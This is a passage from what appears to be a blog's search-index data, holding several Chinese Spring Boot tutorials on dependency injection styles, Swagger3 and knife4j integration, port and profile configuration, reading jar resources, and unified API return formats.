在知道了Spring提供的三种依赖注入方式之后，我们继续回到本文开头说到的问题：IDEA为什么不推荐使用Field Injection呢？\n我们可以从多个开发测试的考察角度来对比一下它们之间的优劣： \n 可靠性 \n 从对象构建过程和使用过程，看对象在各阶段的使用是否可靠来评判： \n \n Field Injection：不可靠 \n Constructor Injection：可靠 \n Setter Injection：不可靠 \n \n 由于构造函数有严格的构建顺序和不可变性，一旦构建就可用，且不会被更改。 \n 可维护性 \n 主要从更容易阅读、分析依赖关系的角度来评判： \n \n Field Injection：差 \n Constructor Injection：好 \n Setter Injection：差 \n \n 还是由于依赖关键的明确，从构造函数中可以显现的分析出依赖关系，对于我们如何去读懂关系和维护关系更友好。 \n 可测试性 \n 当在复杂依赖关系的情况下，考察程序是否更容易编写单元测试来评判 \n \n Field Injection：差 \n Constructor Injection：好 \n Setter Injection：好 \n \n Constructor Injection 和 Setter Injection 的方式更容易Mock和注入对象，所以更容易实现单元测试。 \n 灵活性 \n 主要根据开发实现时候的编码灵活性来判断： \n \n Field Injection：很灵活 \n Constructor Injection：不灵活 \n Setter Injection：很灵活 \n \n 由于 Constructor Injection 对Bean的依赖关系设计有严格的顺序要求，所以这种注入方式不太灵活。相反 Field Injection 和 Setter Injection 就非常灵活，但也因为灵活带来了局面的混乱，也是一把双刃剑。 \n 循环关系的检测 \n 对于Bean之间是否存在循环依赖关系的检测能力： \n \n Field Injection：不检测 \n Constructor Injection：自动检测 \n Setter Injection：不检测 \n 性能表现 \n 不同的注入方式，对性能的影响 \n \n Field Injection：启动快 \n Constructor Injection：启动慢 \n Setter Injection：启动快 \n \n 主要影响就是启动时间，由于Constructor Injection有严格的顺序要求，所以会拉长启动时间。 \n 所以，综合上面各方面的比较，可以获得如下表格： \n \n \n \n 注入方式 \n 可靠性 \n 可维护性 \n 可测试性 \n 灵活性 \n 循环关系的检测 \n 性能影响 \n \n \n \n \n Field Injection \n 不可靠 \n 低 \n 差 \n 很灵活 \n 不检测 \n 启动快 \n \n \n Constructor Injection \n 可靠 \n 高 \n 好 \n 不灵活 \n 自动检测 \n 启动慢 \n \n \n Setter Injection \n 不可靠 \n 低 \n 好 \n 很灵活 \n 不检测 \n 启动慢 \n \n \n \n 结果一目了然， Constructor Injection 在很多方面都是优于其他两种方式的，所以 Constructor Injection 通常都是首选方案！\n而 Setter Injection 比起 Field Injection 来说，大部分都一样，但因为可测试性更好，所以当你要用 @Autowired 的时候，推荐使用 Setter Injection 的方式，这样IDEA也不会给出警告了。同时，也侧面也反映了，可测试性的重要地位啊！ \n 总结 \n 最后，对于今天的问题讨论，我们给出两个结论，方便大家记忆： \n \n 依赖注入的使用上， Constructor Injection 是首选。 \n 使用 @Autowired 注解的时候，要使用 Setter Injection 方式，这样代码更容易编写单元测试。 \n \n"},{title:"Exception in monitor thread while connecting to server localhost:27017 while accessing MongoDB with Java",frontmatter:{title:"Exception in monitor thread while connecting to server localhost:27017 while accessing MongoDB with Java",date:"2021-10-18 21:34:00",tags:["springboot","mongodb"],categories:"big-data",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_mongo_.html",relativePath:"blogs/springboot/springboot_mongo_.md",key:"v-709b8e62",path:"/blogs/springboot/springboot_mongo_.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" have the following exception when running Java app for MongoDB: \n [localhost:27017] org.mongodb.driver.cluster : Exception in monitor thread while connecting to server localhost:27017 while accessing MongoDB with Java\n \n 1 I was to add exclusion annotation to my main annotated class, \n i.e. instead of \n @SpringBootApplication \n \n 1 I should have \n @SpringBootApplication \n @EnableAutoConfiguration ( exclude = { MongoAutoConfiguration . class } ) \n \n 1 2 "},{title:"SpringBoot项目构建成jar运行，如何正确读取resource里的文件",frontmatter:{title:"SpringBoot项目构建成jar运行，如何正确读取resource里的文件",date:"2021-10-09 22:20:27",tags:["Springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_read_jar_config_file.html",relativePath:"blogs/springboot/springboot_read_jar_config_file.md",key:"v-fb8dfee6",path:"/blogs/springboot/springboot_read_jar_config_file.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' Resource下的文件是存在于jar这个文件里面，在磁盘上是没有真实路径存在的，它其实是位于jar内部的一个路径。所以通过ResourceUtils.getFile或者this.g\netClass().getResource("")方法无法正确获取文件。 \n 这种情况下可以采用流的方式来读取文件，拿到文件流再进行相关的操作。如果你使用Spring框架的话，可以采用ClassPathResource来读取文件流， \n    /**\n   * read jar config file\n   *\n   * @throws IOException\n   *\n   *\n   */ \n   public   File   readJarConfFile ( String  jarConfFile )   throws   IOException   { \n     ClassPathResource  resource  =   new   ClassPathResource ( jarConfFile ) ; \n     InputStream  inputStream  =   null ; \n     File  confCopyFile  =   new   File ( jarConfFile ) ; \n    inputStream  =  resource . getInputStream ( ) ; \n     FileUtils . copyInputStreamToFile ( inputStream ,  confCopyFile ) ; \n     IOUtils . closeQuietly ( inputStream ) ; \n     return  confCopyFile ; \n   } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 拿到目标文件后，再按照正常的取法如ResourceUtils.getFile，读取即可。\n使用完后，可以把复制出来的文件删除掉 \n        // delete krb5conf file \n       FileUtils . deleteQuietly ( krb5confCopyFile ) ; \n \n 1 2 '},{title:"java @Resource和@Autowired区别对比",frontmatter:{title:"java @Resource和@Autowired区别对比",date:"2021-12-05 12:10:13",tags:["springboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_resource_autowired.html",relativePath:"blogs/springboot/springboot_resource_autowired.md",key:"v-148b7eb2",path:"/blogs/springboot/springboot_resource_autowired.html",headers:[{level:2,title:"@Resource和@Autowired",slug:"resource和-autowired"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' @Resource和@Autowired \n \n @Resource 和 @Autowired 都可以用来装配bean，都可以用于字段或setter方法。 \n @Autowired 默认按类型装配，默认情况下必须要求依赖对象必须存在，如果要允许null值，可以设置它的required属性为false。 \n @Resource 默认按名称装配，当找不到与名称匹配的bean时才按照类型进行装配。名称可以通过name属性指定，如果没有指定name属性，当注解写在字段上时，默认取字段名，当注解写在setter方法上时，默认取属性名进行装配。 \n \n \n 注意：如果name属性一旦指定，就只会按照名称进行装配。 \n \n \n @Autowire 和 @Qualifier 配合使用效果和@Resource一样： \n \n @Autowired ( required  =   false ) \n @Qualifier ( "example" ) \n private   Example  example ; \n\n @Resource ( name  =   "example" ) \n private   Example  example ; \n \n 1 2 3 4 5 6 \n @Resource 装配顺序 \n \n \n 如果同时指定name和type，则从容器中查找唯一匹配的bean装配，找不到则抛出异常 \n 如果指定name属性，则从容器中查找名称匹配的bean装配，找不到则抛出异常 \n 如果指定type属性，则从容器中查找类型唯一匹配的bean装配，找不到或者找到多个抛出异常 \n 如果都不指定，则自动按照byName方式装配，如果没有匹配，则回退一个原始类型进行匹配，如果匹配则自动装配 \n \n 简要对比表格 \n \n \n \n 注解对比 \n @Resource \n @Autowire \n \n \n \n \n 注解来源 \n JDK \n Spring \n \n \n 装配方式 \n 优先按名称 \n 优先按类型 \n \n \n 属性 \n name、type \n required \n \n \n \n'},{title:"springboot指定端口",frontmatter:{title:"springboot指定端口",date:"2022-02-15T09:48:26.000Z",tags:["port","spingboot"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_server_port.html",relativePath:"blogs/springboot/springboot_server_port.md",key:"v-7d4dc5b5",path:"/blogs/springboot/springboot_server_port.html",headers:[{level:2,title:"使用application.properties文件",slug:"使用application-properties文件"},{level:2,title:"使用application.yml文件",slug:"使用application-yml文件"},{level:2,title:"使用 maven spring-boot plugin(springboot2.X)",slug:"使用-maven-spring-boot-plugin-springboot2-x"},{level:2,title:"命令行中指定启动端口",slug:"命令行中指定启动端口"},{level:2,title:"传入虚拟机系统属性",slug:"传入虚拟机系统属性"},{level:2,title:"使用EmbeddedServletContainerCustomizer接口",slug:"使用embeddedservletcontainercustomizer接口"},{level:3,title:"EmbeddedServletContainerCustomizer接口",slug:"embeddedservletcontainercustomizer接口"},{level:2,title:"使用WebServerFactoryCustomizer接口",slug:"使用webserverfactorycustomizer接口"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" Spring Boot框架提供了用于运行Spring Boot应用程序的默认嵌入式服务器(Tomcat)。它在端口 8080 上运行。可以在Spring Boot中更改端口。 \n 我们可以在 Spring Boot 中更改端口。通过使用以下接口和属性文件: \n \n 使用 application.properties 文件 \n 使用 application.yml 文件 \n 使用 maven spring-boot plugin \n 命令行中指定启动端口 \n 传入虚拟机系统属性 \n 使用 EmbeddedServletContainerCustomizer 接口 \n 使用 WebServerFactoryCustomizer 界面 \n 使用application.properties文件 \n 示例\nserver.port=8082\n \n 1 2 我们还可以将port属性设置为0。它将扫描应用程序的随机端口。每当我们重新启动应用程序时，它都会使用一个新端口。 \n 使用application.yml文件 \n 示例\n server : \n      port : 8082 \n \n 1 2 3 #  使用 maven spring-boot plugin(springboot2.X) \n mvn clean spring-boot:run -Dspring-boot.run.jvmArguments = '-Dserver.port=8088 -Dspring.profiles.active=uat2' \n \n 1 #  命令行中指定启动端口 \n java -jar bootsample. jar --server.port = 9000  --spring.profiles.active = dev\n \n 1 #  传入虚拟机系统属性 \n java - Dserver.port = 9000  -Dspring.profiles.active = uat2 -jar bootsample.jar\n \n 1 #  使用EmbeddedServletContainerCustomizer接口 \n 如果您使用的是 Spring Boot 1.x 版本，它将提供一个接口 EmbeddedServletContainerCustomizer 更改默认端口。 \n EmbeddedServletContainerCustomizer接口 \n 通过使用EmbeddedServletContainerCustomizer，我们可以自定义自动配置的嵌入式Servlet容器。在启动容器本身之前，所有这种类型的Bean都会通过容器工厂获得回调。因此，我们可以设置 端口，地址和 均匀错误页面。它在 org.springframework.boot.context.embedded 包中定义 \n 示例\n @Component \n public   class   ServerCustomizer   implements   EmbeddedServletContainerCustomizer \n { \n     @Override \n     public   void   customize ( ConfigurableEmbeddedServletContainer  container ) \n     { \n        container . setPort ( 8097 ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 #  使用WebServerFactoryCustomizer接口 \n Spring Boot 2.x版本提供了 WebServerFactoryCustomizer 接口来更改默认端口。它在包 org.springframework.boot.web.server 中定义。它解析Web服务器工厂类型的参数 T \n 示例\n @Component \n public   class   ServerCustomizer   implements   WebServerFactoryCustomizer <   ConfigurableWebServerFactory   < \n { \n     @Override \n     public   void   customize ( ConfigurableWebServerFactory  factory ) \n     { \n        factory . setPort ( 9001 ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 "},{title:"SpringBoot集成Swagger3，并导出离线文档",frontmatter:{title:"SpringBoot集成Swagger3，并导出离线文档",date:"2021-10-09 22:38:50",tags:["Springboot","Swagger3"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_swagger3.html",relativePath:"blogs/springboot/springboot_swagger3.md",key:"v-cd0009da",path:"/blogs/springboot/springboot_swagger3.html",headers:[{level:2,title:"指定配置文件",slug:"指定配置文件"},{level:2,title:"配置类",slug:"配置类"},{level:2,title:"Swagger3注解使用说明",slug:"swagger3注解使用说明"},{level:2,title:"添加knife4j依赖",slug:"添加knife4j依赖"},{level:2,title:"启动knife4j",slug:"启动knife4j"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 前言 \n 随着项目架构的演化，前后端分离是不可阻挡的趋势。这种模式的协作在实践的过程中经常会遇到的一个问题就是文档。\n而接口文档便是其中之一，可以说是必不可少的。\n但编写接口文档对开发人员来说是一大难题，而且接口还在不断的变化，还要花费精力去维护接口文档的更新。\n既然存在痛点，那么必须会出现解决此痛点的产品，这就是Swagger，目前已经更新到Swagger3版本了。如果你还停留在Swagger2，建议升级到Swagger3，整体UI风格及交互友好了不少。\n本篇将围绕Swagger3与SpringBoot的集成和离线文档的生成来进行讲解。 \n Swagger简介 \n Swagger是一个规范和完整的框架，用于生成、描述、调用和可视化RESTful风格的Web服务。总体目标是使客户端和文件系统作为服务器以同样的速度来更新。文件的方法，参数和模型紧密集成到服务器端的代码，允许API来始终保持同步。\n官网： swagger.io \n Swagger解决的痛点 \n 传统方式提供文档有以下痛点： \n \n 接口众多，实现细节复杂，编写文档耗费费力，需要持续维护； \n 接口文档需要随时进行同步； \n 接口返回的结果不明确，得构造返回结构体等； \n 不能直接在线测试接口，通常需要额外的工具，比如PostMan等。 \n \n 当引入Swagger之后，以上痛点迎刃而解，同时还带来以下优点： \n \n 及时性 (接口变更后，前后端人员可实时看到最新版本) \n 规范性 (接口具体统一风格，如接口地址，请求方式，参数，响应格式和错误信息等) \n 一致性 (接口信息一致，不会因接口文档版本问题出现分歧) \n 可测性 (可直接基于接口文档进行测试) \n Swagger3的改变 \n Swagger3.0的改动，官方文档总结如下几点： \n \n 删除了对springfox-swagger2的依赖； \n 删除所有@EnableSwagger2...注解； \n 添加了springfox-boot-starter依赖项； \n 移除了guava等第三方依赖； \n 文档访问地址改为http://ip:port/project/swagger-ui/index.html。 \n \n 下面就来实战使用一下吧。 \n SpringBoot集成Swagger3 \n SpringBoot集成Swagger3与SpringBoot集成其他框架的套路基本一致，通常包括：引入依赖、指定配置文件、创建配置类和使用。\n##　引入依赖\n在SpringBoot项目的pom.xml中引入Swagger3依赖： \n < dependency > \n     < groupId > io.springfox </ groupId > \n     < artifactId > springfox-boot-starter </ artifactId > \n     < version > 3.0.0 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  指定配置文件 \n 通常情况下swagger只能在开发环境或测试环境下开启，生产环境下需要进行关闭的。而swagger的开启与关闭可在application.properties中进行配置： \n生产环境需设置为false\nspringfox.documentation.swagger-ui.enabled=true\n \n 1 2 #  配置类 \n 通过@EnableOpenApi注解启动用Swagger的使用，同时在配置类中对Swagger的通用参数进行配置。 \n @Configuration \n @EnableOpenApi \n public   class   Swagger3Config   { \n\n     @Bean \n     public   Docket   createRestApi ( )   { \n         //返回文档摘要信息 \n         return   new   Docket ( DocumentationType . OAS_30 ) \n                 . apiInfo ( apiInfo ( ) ) \n                 . select ( ) \n                 . apis ( RequestHandlerSelectors . withMethodAnnotation ( Operation . class ) ) \n                 . paths ( PathSelectors . any ( ) ) \n                 . build ( ) \n                 . globalRequestParameters ( getGlobalRequestParameters ( ) ) \n                 . globalResponses ( HttpMethod . GET ,   getGlobalResponseMessage ( ) ) \n                 . globalResponses ( HttpMethod . POST ,   getGlobalResponseMessage ( ) ) ; \n     } \n\n     /**\n     * 生成接口信息，包括标题、联系人等\n     */ \n     private   ApiInfo   apiInfo ( )   { \n         return   new   ApiInfoBuilder ( ) \n                 . title ( "Swagger3接口文档" ) \n                 . description ( "如有疑问，可联系二师兄，微信：zhuan2quan" ) \n                 . contact ( new   Contact ( "二师兄" ,   "https://www.choupangxia.com/" ,   "secbro2@gmail.com" ) ) \n                 . version ( "1.0" ) \n                 . build ( ) ; \n     } \n\n     /**\n     * 封装全局通用参数\n     */ \n     private   List < RequestParameter >   getGlobalRequestParameters ( )   { \n         List < RequestParameter >  parameters  =   new   ArrayList < > ( ) ; \n        parameters . add ( new   RequestParameterBuilder ( ) \n                 . name ( "uuid" ) \n                 . description ( "设备uuid" ) \n                 . required ( true ) \n                 . in ( ParameterType . QUERY ) \n                 . query ( q  ->  q . model ( m  ->  m . scalarModel ( ScalarType . STRING ) ) ) \n                 . required ( false ) \n                 . build ( ) ) ; \n         return  parameters ; \n     } \n\n     /**\n     * 封装通用响应信息\n     */ \n     private   List < Response >   getGlobalResponseMessage ( )   { \n         List < Response >  responseList  =   new   ArrayList < > ( ) ; \n        responseList . add ( new   ResponseBuilder ( ) . code ( "404" ) . description ( "未找到资源" ) . build ( ) ) ; \n         return  responseList ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 通过以上配置已经完成了Spring Boot与Swagger的集成，下面展示一下如何在业务逻辑中进行使用。 \n 业务中使用 \n 创建两个实体类Goods（商品类）和CommonResult（通用返回结果类）。 \n Goods类 \n @ApiModel ( "商品模型" ) \n public   class   Goods   { \n\n     /**\n     * 商品id\n     */ \n     @ApiModelProperty ( "商品ID" ) \n     Long  goodsId ; \n\n     /**\n     * 商品名称\n     */ \n     @ApiModelProperty ( "商品名称" ) \n     private   String  goodsName ; \n\n     /**\n     * 商品价格\n     */ \n     @ApiModelProperty ( "商品价格" ) \n     private   BigDecimal  price ; \n\n     // 省略getter/setter \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 CommonResult类： \n @ApiModel ( "API通用数据" ) \n public   class   CommonResult < T >   { \n\n     /**\n     * 标识代码，0表示成功，非0表示出错\n     */ \n     @ApiModelProperty ( "标识代码,0表示成功，非0表示出错" ) \n     private   Integer  code ; \n\n     /**\n     * 描述信息，通常错时使用\n     */ \n     @ApiModelProperty ( "错误描述" ) \n     private   String  msg ; \n\n     /**\n     * 业务数据\n     */ \n     @ApiModelProperty ( "业务数据" ) \n     private   T  data ; \n\n     public   CommonResult ( Integer  status ,   String  msg ,   T  data )   { \n         this . code  =  status ; \n         this . msg  =  msg ; \n         this . data  =  data ; \n     } \n\n     /**\n     * 成功\n     */ \n     public   static   < T >   CommonResult < T >   success ( T  data )   { \n         return   new   CommonResult < > ( 0 ,   "成功" ,  data ) ; \n     } \n\n     public   static   < T >   CommonResult < T >   success ( Integer  code ,   String  msg )   { \n         return   new   CommonResult < > ( code ,  msg ,   null ) ; \n     } \n\n     /**\n     * 错误\n     */ \n     public   static   < T >   CommonResult < T >   error ( int  code ,   String  msg )   { \n         return   new   CommonResult < > ( code ,  msg ,   null ) ; \n     } \n\n     // 省略getter/setter \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 下面针对Controller层的接口来使用Swagger对应的API。 \n GoodsController类： \n @Api ( tags  =   "商品信息管理接口" ) \n @RestController \n @RequestMapping ( "/goods" ) \n public   class   GoodsController   { \n\n     @Operation ( summary  =   "单个商品详情" ) \n     @GetMapping ( "/findGoodsById" ) \n     public   CommonResult < Goods >   findGoodsById ( \n             @Parameter ( description  =   "商品ID,正整数" ) \n             @RequestParam ( value  =   "goodsId" ,  required  =   false ,  defaultValue  =   "0" )   Integer  goodsId )   { \n         System . out . println ( "根据商品ID="   +  goodsId  +   "查询商品详情" ) ; \n         Goods  goods  =   new   Goods ( ) ; \n        goods . setGoodsId ( 1L ) ; \n        goods . setGoodsName ( "笔记本" ) ; \n        goods . setPrice ( new   BigDecimal ( 8888 ) ) ; \n         return   CommonResult . success ( goods ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 OrderController类： \n @Api ( tags  =   "订单管理接口" ) \n @RestController \n @RequestMapping ( "/order" ) \n public   class   OrderController   { \n\n     @Operation ( summary  =   "提交订单" ) \n     @PostMapping ( "/order" ) \n     @ApiImplicitParams ( { \n             @ApiImplicitParam ( name  =   "userId" ,  value  =   "用户id" ,  dataTypeClass  =   Long . class ,  paramType  =   "query" ,  example  =   "123" ) , \n             @ApiImplicitParam ( name  =   "goodsId" ,  value  =   "商品id" ,  dataTypeClass  =   Integer . class ,  paramType  =   "query" ,  example  =   "1" ) \n     } ) \n     public   CommonResult < String >   toBuy ( @ApiIgnore   @RequestParam   Map < String ,   String >  params )   { \n         System . out . println ( params ) ; \n         return   CommonResult . success ( "success" ) ; \n     } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #  展示效果 \n 完成集成，启动SpringBoot项目，在访问地址： \n http://127.0.0.1:8080/swagger-ui/index.html\n \n 1 #  Swagger3注解使用说明 \n 经过上述实例之后，我们知道大多数API是如何使用的了，这了再汇总一下相关API的功能： \n @Api：用在请求的类上，表示对类的说明\n    tags="说明该类的作用，可以在UI界面上看到的注解"\n    value="该参数没什么意义，在UI界面上也看到，所以不需要配置"\n\n@ApiOperation：用在请求的方法上，说明方法的用途、作用\n    value="说明方法的用途、作用"\n    notes="方法的备注说明"\n\n@ApiImplicitParams：用在请求的方法上，表示一组参数说明\n    @ApiImplicitParam：用在@ApiImplicitParams注解中，指定一个请求参数的各个方面\n        name：参数名\n        value：参数的汉字说明、解释\n        required：参数是否必须传\n        paramType：参数放在哪个地方\n            · header --\x3e 请求参数的获取：@RequestHeader\n            · query --\x3e 请求参数的获取：@RequestParam\n            · path（用于restful接口）--\x3e 请求参数的获取：@PathVariable\n            · body（不常用）\n            · form（不常用）    \n        dataType：参数类型，默认String，其它值dataType="Integer"       \n        defaultValue：参数的默认值\n\n@ApiResponses：用在请求的方法上，表示一组响应\n    @ApiResponse：用在@ApiResponses中，一般用于表达一个错误的响应信息\n        code：数字，例如400\n        message：信息，例如"请求参数没填好"\n        response：抛出异常的类\n\n@ApiModel：用于响应类上，表示一个返回响应数据的信息\n            （这种一般用在post创建的时候，使用@RequestBody这样的场景，\n            请求参数无法使用@ApiImplicitParam注解进行描述的时候）\n    @ApiModelProperty：用在属性上，描述响应类的属性\n\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #  导出离线文档 \n Swagger为我们提供了方便的在线文档支持，但某些场景下我们需要把接口文档提供给合作人员，而不是直接给一个地址。此时，我们就需要将接口文档导出为离线文档。 \n 这里我们集成增强文档knife4j来实现离线文档的导出 \n 添加knife4j依赖 \n 在pom.xml中增加knife4j的依赖： \n < dependency > \n     < groupId > com.github.xiaoymin </ groupId > \n     < artifactId > knife4j-spring-boot-starter </ artifactId > \n     < version > 3.0.2 </ version > \n </ dependency > \n \n 1 2 3 4 5 #  启动knife4j \n 在上面配置Swagger的Swagger3Config中添加@EnableKnife4j注解，该注解可以开启knife4j的增强功能。 \n @EnableKnife4j \n @Configuration \n @EnableOpenApi \n public   class   Swagger3Config   { \n     // ... \n } \n \n 1 2 3 4 5 6 此时，如果依旧访问http://localhost:8080/swagger-ui/index.html 会发现显示并没有变化。这里我们需要访问http://localhost:8080/doc.html。 \n'},{title:"spring-boot和springframework、jdk的版本关系",frontmatter:{title:"spring-boot和springframework、jdk的版本关系",date:"2021-09-28 23:20:27",tags:["springboot","spring"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_spring_version.html",relativePath:"blogs/springboot/springboot_spring_version.md",key:"v-ba53614e",path:"/blogs/springboot/springboot_spring_version.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" spring-boot和springframework、jdk的版本关系 \n \n \n \n spring-boot版本 \n 依赖springframework \n jdk版本 \n 发布时间 \n \n \n \n \n 1.0.0.RELEASE \n 4.0.3.RELEASE \n 1.7.0_45 \n 2014 \n \n \n 1.1.0.RELEASE \n 4.0.5.RELEASE \n 1.7.0_55 \n 2014 \n \n \n 1.2.0.RELEASE \n 4.1.3.RELEASE \n 1.7.0_67 \n 2014 \n \n \n 1.3.0.RELEASE \n 4.2.3.RELEASE \n 1.8.0_60 \n 2015 \n \n \n 1.4.0.RELEASE \n 4.3.2.RELEASE \n 1.8.0_60 \n 2016 \n \n \n 1.5.0.RELEASE \n 4.3.6.RELEASE \n 1.8.0_101 \n 2017-01 \n \n \n 1.5.22.RELEASE \n – \n – \n 2019-08 \n \n \n 2.0.0.RELEASE \n 5.0.4.RELEASE \n 1.8.0_141 \n 2018-03 \n \n \n 2.0.9.RELEASE \n 5.0.13.RELEASE \n 1.8.0_202 \n 2019-04 \n \n \n 2.1.0.RELEASE \n 5.1.2.RELEASE \n – \n 2010-10 \n \n \n 2.1.18.RELEASE \n 5.1.19.RELEASE \n – \n 2020-10 \n \n \n 2.2.0.RELEASE \n 5.2.0.RELEASE \n – \n 2019-10 \n \n \n 2.2.13.RELEASE \n 5.2.12.RELEASE \n – \n 2021-01 \n \n \n 2.3.0.RELEASE \n –\t–\t2020-03 \n \n \n \n \n 2.3.10.RELEASE \n 5.2.14.RELEASE \n – \n 2021-04 \n \n \n 2.4.0 \n 5.3.1.RELEASE \n – \n 2020-11 \n \n \n 2.4.5 \n 5.3.6.RELEASE \n 1.8 \n 2021-04 \n \n \n \n"},{title:"SpringBoot - 多Profile使用与切换-指定配置文件",frontmatter:{title:"SpringBoot - 多Profile使用与切换-指定配置文件",date:"2021-10-27 20:16:29",tags:["SpringBoot","Profiles"],categories:"back-end-java",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_switch_applicationconfig.html",relativePath:"blogs/springboot/springboot_switch_applicationconfig.md",key:"v-6ba133d7",path:"/blogs/springboot/springboot_switch_applicationconfig.html",headers:[{level:2,title:"多Profile文件",slug:"多profile文件"},{level:2,title:"yml多文档快",slug:"yml多文档快"},{level:2,title:"激活指定配置方式",slug:"激活指定配置方式"},{level:3,title:"配置文件方式",slug:"配置文件方式"},{level:3,title:"命令行方式",slug:"命令行方式"},{level:3,title:"编辑Configurations，填写命令行参数或虚拟机参数",slug:"编辑configurations-填写命令行参数或虚拟机参数"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Profile是Spring对不同环境提供不同配置功能的支持，可以通过激活、指定参数等方式快速切换环境。 \n 多Profile文件 \n 文件名格式： \n application - { profile } .properties\n \n 1 默认使用application.properties配置文件。 \n spring.profiles.active=dev\n \n 1 #  yml多文档快 \n yml文件中支持使用三个短横线分割文档块的方式。 \n server : \n   port :   8082 \n spring : \n   profiles : \n     active :  dev\n --- \n spring : \n   profiles :  dev\n server : \n   port :   8083 \n --- \n spring : \n   profiles :  prod\n server : \n   port :   8084 \n --- \n spring : \n   profiles :  default\n server : \n   port :   80 \n --- \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #  激活指定配置方式 \n 配置文件方式 \n spring : \n   profiles : \n     active :  dev\n \n 1 2 3 或者 \n spring.profiles.active=dev\n \n 1 #  命令行方式 \n 不打包 运行 \n mvn clean spring-boot:run -Dspring-boot.run.jvmArguments = \'-Dserver.port=9002 -Dspring.profiles.active=uat2\' \n \n 1 在打包后运行的时候，添加参数 \n命令行中指定启动端口 \njava -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar --server.port = 9000  --spring.profiles.active = dev\n传入虚拟机系统属性 \njava - Dserver.port = 9000  -Dspring.profiles.active = uat2 -jar bootsample.jar\n \n 1 2 3 4 5 #  编辑Configurations，填写命令行参数或虚拟机参数 \n \n idea \n \n VM options \n -Dspring.profiles.active = dev\n \n 1 Program arguments \n --spring.profiles.active = dev\n \n 1 \n VS Code \n \n VM options \n "vmArgs" :   "-Dspring.profiles.active=dev" \n \n 1 Program arguments \n "args" :   "--spring.profiles.active=dev" \n \n 1 '},{title:"SpringBoot系列: 统一后端返回格式",frontmatter:{title:"SpringBoot系列: 统一后端返回格式",date:"2022-01-01 22:53:54",tags:["SpringBoot系列","web","resultformat"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/springboot/springboot_unified_backend_return_format.html",relativePath:"blogs/springboot/springboot_unified_backend_return_format.md",key:"v-22946ad5",path:"/blogs/springboot/springboot_unified_backend_return_format.html",headers:[{level:2,title:"为什么要对SpringBoot返回统一的标准格式",slug:"为什么要对springboot返回统一的标准格式"},{level:3,title:"第一种：返回 String",slug:"第一种-返回-string"},{level:3,title:"第二种：返回自定义对象",slug:"第二种-返回自定义对象"},{level:3,title:"第三种：接口异常",slug:"第三种-接口异常"},{level:2,title:"定义返回标准格式",slug:"定义返回标准格式"},{level:2,title:"定义返回对象",slug:"定义返回对象"},{level:2,title:"定义状态码",slug:"定义状态码"},{level:2,title:"统一返回格式",slug:"统一返回格式"},{level:2,title:"高级实现方式",slug:"高级实现方式"},{level:3,title:"@RestControllerAdvice注解",slug:"restcontrolleradvice注解"},{level:3,title:"String类型判断",slug:"string类型判断"},{level:2,title:"接口异常问题",slug:"接口异常问题"},{level:2,title:"SpringBoot为什么需要全局异常处理器",slug:"springboot为什么需要全局异常处理器"},{level:2,title:"如何实现全局异常处理器",slug:"如何实现全局异常处理器"},{level:2,title:"体验效果",slug:"体验效果"},{level:2,title:"全局异常接入返回的标准格式",slug:"全局异常接入返回的标准格式"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 为什么要对SpringBoot返回统一的标准格式 \n 在默认情况下，SpringBoot的返回格式常见的有三种： \n 第一种：返回 String \n @GetMapping ( "/hello" ) \n public   String   getStr ( ) { \n   return   "hello,javadaily" ; \n } \n \n 1 2 3 4 此时调用接口获取到的返回值是这样： \n hello , javadaily\n \n 1 #  第二种：返回自定义对象 \n @GetMapping ( "/aniaml" ) \n public   Aniaml   getAniaml ( ) { \n   Aniaml  aniaml  =   new   Aniaml ( 1 , "pig" ) ; \n   return  aniaml ; \n } \n \n 1 2 3 4 5 此时调用接口获取到的返回值是这样： \n { \n   "id" :   1 , \n   "name" :   "pig" \n } \n \n 1 2 3 4 #  第三种：接口异常 \n @GetMapping ( "/error" ) \n public   int   error ( ) { \n     int  i  =   9 / 0 ; \n     return  i ; \n } \n \n 1 2 3 4 5 此时调用接口获取到的返回值是这样： \n { \n   "timestamp" :   "2021-07-08T08:05:15.423+00:00" , \n   "status" :   500 , \n   "error" :   "Internal Server Error" , \n   "path" :   "/wrong" \n } \n \n 1 2 3 4 5 6 